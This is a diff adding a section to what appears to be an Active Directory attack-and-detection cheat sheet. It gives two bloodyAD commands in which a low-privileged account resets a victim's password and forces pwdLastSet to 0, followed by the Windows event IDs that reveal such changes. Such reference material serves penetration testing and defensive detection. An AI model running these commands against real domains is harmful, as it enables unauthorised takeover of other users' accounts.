@@ -21,3 +21,16 @@ Password-reset abuse chain: force `pwdLastSet=0` / reset a victim’s password (
 
 ### Commands
 ```bash
+# ── Reset victim password ────────────────────────────────────────────
+bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
+  set password victim 'NewP@ss1'
+
+# ── Force pwdLastSet = 0 ─────────────────────────────────────────────
+bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
+  set object victim pwdLastSet -v 0
+```
+
+### Detection
+**4723/4724** password changes by non-owner; **5136** `pwdLastSet` writes.
+
+---
